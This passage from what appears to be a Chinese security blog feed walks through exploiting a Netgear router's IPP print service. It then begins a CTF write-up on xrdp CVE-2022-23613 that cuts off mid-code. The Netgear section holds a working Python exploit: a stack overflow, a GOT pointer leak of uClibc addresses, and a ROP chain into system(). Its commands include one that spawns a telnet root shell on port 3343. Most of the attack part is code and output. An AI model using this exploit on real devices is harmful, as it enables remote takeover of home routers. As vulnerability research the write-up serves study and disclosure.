class="keyword">int</span> v10; <span class="comment">// [sp+1064h] [bp-50h]</span></span><br><span class="line"><span class="keyword">size_t</span> copy_len; <span class="comment">// [sp+1068h] [bp-4Ch]</span></span><br><span class="line"><span class="keyword">int</span> v12; <span class="comment">// [sp+106Ch] [bp-48h]</span></span><br><span class="line"><span class="keyword">size_t</span> cnt; <span class="comment">// [sp+1070h] [bp-44h]</span></span><br><span class="line"><span class="keyword">size_t</span> prefix_size; <span class="comment">// [sp+1074h] [bp-40h]</span></span><br><span class="line"><span class="keyword">int</span> total; <span class="comment">// [sp+1078h] [bp-3Ch]</span></span><br><span class="line"><span class="keyword">void</span> *prefix_ptr; <span class="comment">// [sp+107Ch] [bp-38h]</span></span><br><span class="line"><span class="keyword">int</span> v17; <span class="comment">// [sp+1080h] [bp-34h]</span></span><br><span class="line"><span class="keyword">int</span> client_sock; <span class="comment">// [sp+1084h] [bp-30h]</span></span><br><span class="line"><span class="keyword">int</span> v19; <span class="comment">// [sp+1088h] [bp-2Ch]</span></span><br><span class="line"><span class="keyword">int</span> v20; <span class="comment">// [sp+108Ch] [bp-28h]</span></span><br><span class="line"><span class="keyword">char</span> flag1; <span class="comment">// [sp+1093h] [bp-21h]</span></span><br><span class="line"><span class="keyword">char</span> v22; <span class="comment">// [sp+1094h] [bp-20h]</span></span><br><span class="line"><span class="keyword">char</span> job_state_resons; <span class="comment">// [sp+1095h] [bp-1Fh]</span></span><br><span class="line"><span class="keyword">char</span> job_state; <span class="comment">// [sp+1096h] [bp-1Eh]</span></span><br><span class="line"><span class="keyword">char</span> job_originating_user_name; <span class="comment">// [sp+1097h] [bp-1Dh]</span></span><br><span class="line"><span class="keyword">char</span> job_name; <span class="comment">// [sp+1098h] [bp-1Ch]</span></span><br><span class="line"><span class="keyword">char</span> job_id; <span class="comment">// [sp+1099h] [bp-1Bh]</span></span><br><span class="line"><span class="keyword">char</span> v28; <span class="comment">// [sp+109Ah] [bp-1Ah]</span></span><br><span class="line"><span class="keyword">char</span> flag2; <span class="comment">// [sp+109Bh] [bp-19h]</span></span><br><span class="line"><span class="keyword">size_t</span> final_size; <span class="comment">// [sp+109Ch] [bp-18h]</span></span><br><span class="line"><span class="keyword">int</span> offset; <span class="comment">// [sp+10A0h] [bp-14h]</span></span><br><span class="line"><span class="keyword">size_t</span> response_len; <span class="comment">// [sp+10A4h] [bp-10h]</span></span><br><span class="line"><span class="keyword">void</span> *final_ptr; <span class="comment">// [sp+10A8h] [bp-Ch]</span></span><br><span class="line"><span class="keyword">size_t</span> subffix_offset; <span class="comment">// [sp+10ACh] [bp-8h]</span></span><br></pre></td></tr></table></figure><p>最首先的想法肯定是通过覆盖 <code>prefix_ptr</code> 指向 <code>.got</code>  来做读写， 但是如果我们直接的指向了函数的 <code>.got</code>  , 例如 <code>strcpy_ptr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span></span><br></pre></td></tr></table></figure><p>但是在调用 <code>write_ipp_response</code> 后， 程序会 <code>free(prefix_ptr);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line"><span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">  prefix_ptr = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是直接控制  <code>prefix_ptr == 000180F0</code> ， 在 <code>free</code> 的过程中会造成崩溃。 最后我们发现当把 <code>prefix_ptr </code> 指向 <code>.got</code>  的开头</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180E4</span>                                         ; sub_8C0C+<span class="number">8</span>↑o ...</span><br><span class="line">.got:<span class="number">000180E8</span>                 DCD <span class="number">0</span></span><br><span class="line">.got:<span class="number">000180</span>EC off_180EC       DCD <span class="number">0</span>                   ; DATA XREF: sub_8C0C+C↑r</span><br><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span>↑r</span><br></pre></td></tr></table></figure><p>即将 <code>prefix_ptr</code> 指向  <code>000180E4</code>  是不会崩溃的。</p><blockquote><p>这里和 小伙伴  @aobo @leomxxj 讨论来下 ， 猜测应该是如果是 free(0x000180EC) ， 当 uclibc 会对  libc 的地址写， 造成 crash<br>如果 free(0x00180E4) </p><p>pwndbg&gt; telescope 0x000180E4<br>    00:0000│  0x180e4 —▸ 0x1800c ◂— 0x1<br>    01:0004│  0x180e8 —▸ 0x40024030 ◂— 0x0<br>pwndbg&gt; vmmap 0x1800c<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br> 0x18000    0x19000 rw-p     1000 10000  /usr/bin/KC_PRINT +0xc<br>0x1800c 地址是可读写的</p></blockquote><p>另外在编写这部分 exploit 的时候， 我们发现处理 <code>recv_buf</code> 消息的时候</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br></pre></td></tr></table></figure><p>这部分是一个 <code>while</code> 循环，只有当消息为 <code>\x03</code> 的时候， 才会结束循环， 因此我们需要 <code>offset</code>  设置好， </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    offset += copy_len;</span><br><span class="line">.text:<span class="number">00010</span>A30                 LDR             R2, [R11,<span class="meta">#offset]</span></span><br><span class="line">.text:<span class="number">00010</span>A34                 LDR             R3, [R11,#copy_len]</span><br><span class="line">.text:<span class="number">00010</span>A38                 ADD             R3, R2, R3</span><br><span class="line">.text:<span class="number">00010</span>A3C                 STR             R3, [R11,#<span class="number">-0x14</span>]</span><br></pre></td></tr></table></figure><p>结束循环到 <code>write_ipp_response</code> 函数之前 ，我们还需要过两个地方， 第一个处， 为了方便我们在 <code>command</code>  前设置一个 <code>job-id</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">    offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">    <span class="keyword">if</span> ( flag2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">      <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state-reasons&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state_resons = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_name = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-originating-user-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_originating_user_name = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-id&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_id = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v28 )</span><br><span class="line">        &#123;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset - <span class="number">2</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">        subffix_offset += cnt;</span><br><span class="line">        v28 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset += copy_len;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">final_size += prefix_size;</span><br><span class="line"><span class="keyword">if</span> ( flag1 )</span><br><span class="line">  v20 = sub_11D68(v17, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, v9);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v20 = sub_11D68(v17, job_id, job_name, job_originating_user_name, job_state, job_state_resons, v22, v9);</span><br><span class="line"><span class="keyword">if</span> ( v20 &gt; <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>第二处 <code>final_ptr = malloc(++final_size);</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LABEL_54:</span><br><span class="line">    *(final_ptr + response_len++) = <span class="number">3</span>;</span><br><span class="line">    v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line">    <span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">      prefix_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(final_ptr);</span><br><span class="line">      final_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  final_ptr = <span class="built_in">malloc</span>(++final_size);</span><br><span class="line">  <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(final_ptr, <span class="number">0</span>, final_size);</span><br><span class="line">    cnt = memcpy_n(final_ptr, response_len, prefix_ptr, prefix_size);</span><br><span class="line">    response_len += cnt;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>我们得让 <code>final_size</code> 的值不能太大，不然分配不出来程序就不会走到 <code>write_ipp_response</code> 里，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00010D78 loc_10D78                               ; CODE XREF: Response_Get_Jobs+868↑j</span><br><span class="line">.text:00010D78                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D7C                 ADD             R3, R3, #1</span><br><span class="line">.text:00010D80                 STR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D84                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D88                 MOV             R0, R3  ; size</span><br><span class="line">.text:00010D8C                 BL              malloc</span><br></pre></td></tr></table></figure><p>即需要设置 <code>[R11, #-0x18]</code> 的值， 这是在栈上的。 最后我 leak 的代码大致如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># recv_buf[2] || recv_buf[3] == 10</span></span><br><span class="line">    recv_buf1  = <span class="string">b&#x27;\x00\x00\x00\x0a\x00\x00\x99\x99&#x27;</span></span><br><span class="line">    recv_buf2  = <span class="string">b&#x27;\x00\x44\x00\x00\x10\x5d&#x27;</span> <span class="comment"># 0x1050 is copy_len -&gt; memcpy(command, &amp;recv_buf[offset], copy_len);</span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;job-id\x00\x00&#x27;</span> </span><br><span class="line"></span><br><span class="line">    junkdata = cyclic(<span class="number">0x104c</span> , n=<span class="number">4</span>)</span><br><span class="line">    junkdata = bytearray(junkdata)</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ len(cmd)] = cmd</span><br><span class="line">    junkdata[<span class="number">0x103c</span>: <span class="number">0x103c</span> + <span class="number">4</span>] = p32(<span class="number">0x106a</span><span class="number">-0xe</span>) <span class="comment"># finish flag offset</span></span><br><span class="line">    junkdata[<span class="number">0x1048</span>: <span class="number">0x1048</span> + <span class="number">4</span>] = p32(<span class="number">0x20</span>)     <span class="comment"># malloc size  - &gt; final_ptr = malloc(++final_size);</span></span><br><span class="line">    junkdata = bytes(junkdata)</span><br><span class="line"></span><br><span class="line">    recv_buf2 += junkdata</span><br><span class="line">    recv_buf2 += p32(<span class="number">20</span>)       <span class="comment"># overwrite  prrefix_size</span></span><br><span class="line">    recv_buf2 += p32(<span class="number">0x180E4</span>)  <span class="comment"># overwrite  prefix_ptr -&gt; .got start address then free is alive </span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;\x03&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload =  <span class="string">b&#x27;POST /USB1_LQ\r\n&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;Content-Length: %b\r\n&#x27;</span> % str(len(recv_buf1 + recv_buf2)).encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">&quot;192.168.1.1&quot;</span>, <span class="number">631</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.send(recv_buf1)</span><br><span class="line">    p.send(recv_buf2)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    _dl_linux_resolve = u32(p.recvn(<span class="number">4</span>)) </span><br><span class="line">    print(<span class="string">&#x27;_dl_linux_resolve : &#123;:#x&#125;&#x27;</span>.format(_dl_linux_resolve))</span><br><span class="line">    ld_uClibc =  _dl_linux_resolve - <span class="number">0x3e70</span></span><br><span class="line">    print(<span class="string">&#x27;ld_uClibc : &#123;:#x&#125;&#x27;</span>.format(ld_uClibc))</span><br><span class="line">    p.recvn(<span class="number">4</span>)</span><br><span class="line">    printf_addr = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">    print(<span class="string">&#x27;printf : &#123;:#x&#125;&#x27;</span>.format(printf_addr))</span><br><span class="line">    uClibc = printf_addr - <span class="number">0x360e0</span></span><br><span class="line">    print(<span class="string">&#x27;uClibc : &#123;:#x&#125;&#x27;</span>.format(uClibc))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system = uClibc + +0x90f4 # system offset </span></span><br><span class="line">    <span class="comment"># print(&#x27;system : &#123;:#x&#125;&#x27;.format(system))</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ld_uClibc, uClibc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Leak:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp_ncc_netgear_ipp.py</span><br><span class="line">[+] Opening connection to 192.168.1.1 on port 631: Done</span><br><span class="line">_dl_linux_resolve : 0x40021e70</span><br><span class="line">ld_uClibc : 0x4001e000</span><br><span class="line"><span class="built_in">printf</span> : 0x401700e0</span><br><span class="line">uClibc : 0x4013a000</span><br></pre></td></tr></table></figure><h3 id="Arbitrary-command-execution"><a href="#Arbitrary-command-execution" class="headerlink" title="Arbitrary command execution"></a>Arbitrary command execution</h3><p>通过泄漏 uclibc 的地址， 然后可以计算 <code>system</code>  的地址。 然后我们就可以进一步做劫持返回地址工作。首先我们需要有个一个地址来存储我们 <code>system</code> 将执行的字符串。 回顾上文， 我们提及到了系统的随机化等级为 <code>1</code> 。</p><p>系统随机化开启情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>因此我们可以在堆上查找是否有可控的内容， 通过 <code>hexdump</code> 查找。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png"></a></p><p>我们发现我们的 payload 会存储在 堆上， 因此 ， 我们可以将要执行的命令， 在第一次链接的时候 ， 就将命令写入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">b&#x27;/bin/utelnetd -p 3343 -l /bin/ash \x00&#x27;</span></span><br><span class="line">cmd = <span class="string">b&#x27;/bin/touch /tmp/hacked&#x27;</span></span><br><span class="line">cmd += <span class="string">b&quot;\x00&quot;</span> * (len(cmd) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line">...</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ len(cmd)] = cmd</span><br></pre></td></tr></table></figure><p>在覆盖返回地址之前 ， 除了在 leak 需要注意的那几个变量以外 ，我们还需要单独注意</p><ul><li>flag1</li><li>v17</li><li>response_len</li></ul><p>等变量的值， 要单独重新赋值。</p><p>最后我们需要将 <code>R0</code> 的值指向堆上的 <code>0x1b880</code> 地址。 所以我们需要单独几个 <code>gadget</code> ， 这里我使用的是两个 <code>gadget</code> 。</p><p>首先通过第一个  <code>gadget</code>  控制 <code>R3</code>  为 0x1b880</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00001504 : pop &#123;r3, r4, fp, pc&#125;</span><br></pre></td></tr></table></figure><p>然后通过 第二个 <code>gadget</code>  将 <code>R3</code> 的值赋值给 <code>R0</code> 并且控制 PC 跳转到 <code>system</code> 函数上，从而完成任意命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000a80 : mov r0, r3 ; pop &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure><p>最后就可以完成任意命令执行了。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://research.nccgroup.com/2022/08/30/ncc-con-europe-2022-pwn2own-austin-presentations/">NCC Con Europe 2022 – Pwn2Own Austin Presentations</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="netgear" scheme="https://bestwing.me/tags/netgear/"/>
    
  </entry>
  
  <entry>
    <title>2022 QWB Final RealWorld Challenge Writeup</title>
    <link href="https://bestwing.me/2022-QWB-Final-RealWorld-Challenge-Writeup.html"/>
    <id>https://bestwing.me/2022-QWB-Final-RealWorld-Challenge-Writeup.html</id>
    <published>2022-08-23T16:00:00.000Z</published>
    <updated>2022-08-24T08:35:25.585Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今年与0x300R的小伙伴参与了 2022 QWB Final  ， 在这次比赛中我和小伙伴们 解决了不少 RW 题目， 而我本人参与的一共有三道路由器题、一道 RDP 提权 、 一道 VPN  题目。在此我简单记述下其中的路由器题以及 RDP 题目， 而 VPN 题目涉及一些别的事情，就不方便公开。</p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p>题目要求我们攻击 XRDP 然后进行本地提权的效果 ， 获取ubuntu操作系统root权限， 并在/目录成功写入内容包含队伍特征的flag文件。</p><p>程序版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@RDP:/home/rdp/Desktop<span class="comment"># xrdp-sesman -version</span></span><br><span class="line">xrdp-sesman 0.9.18</span><br><span class="line">  The xrdp session manager</span><br><span class="line">  Copyright (C) 2004-2020 Jay Sorg, Neutrino Labs, and all contributors.</span><br><span class="line">  See https://github.com/neutrinolabs/xrdp <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">  Configure options:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该版本受到 <code>CVE-2022-23613</code> 影响</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>补丁代码： <a href="https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa">https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">sesman_data_in(struct trans *self)</span><br><span class="line">&#123;</span><br><span class="line"><span class="addition">+ #define HEADER_SIZE 8</span></span><br><span class="line">    int version;</span><br><span class="line">    int size;</span><br><span class="line"></span><br><span class="line">    if (self-&gt;extra_flags == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        in_uint32_be(self-&gt;in_s, version);</span><br><span class="line">        in_uint32_be(self-&gt;in_s, size);</span><br><span class="line"><span class="deletion">-        if (size &gt; self-&gt;in_s-&gt;size)</span></span><br><span class="line"><span class="addition">+        if (size &lt; HEADER_SIZE || size &gt; self-&gt;in_s-&gt;size)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="deletion">-            LOG(LOG_LEVEL_ERROR, &quot;sesman_data_in: bad message size&quot;);</span></span><br><span class="line"><span class="addition">+            LOG(LOG_LEVEL_ERROR, &quot;sesman_data_in: bad message size %d&quot;, size);</span></span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        self-&gt;header_size = size;</span><br><span class="line">@@ -302,11 +303,12 @@ sesman_data_in(struct trans *self)</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        /* reset for next message */</span><br><span class="line"><span class="deletion">-        self-&gt;header_size = 8;</span></span><br><span class="line"><span class="addition">+        self-&gt;header_size = HEADER_SIZE;</span></span><br><span class="line">        self-&gt;extra_flags = 0;</span><br><span class="line">        init_stream(self-&gt;in_s, 0); /* Reset input stream pointers */</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line"><span class="addition">+ #undef HEADER_SIZE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/******************************************************************************/</span><br></pre></td></tr></table></figure><p>通过分析补丁，我们知道</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 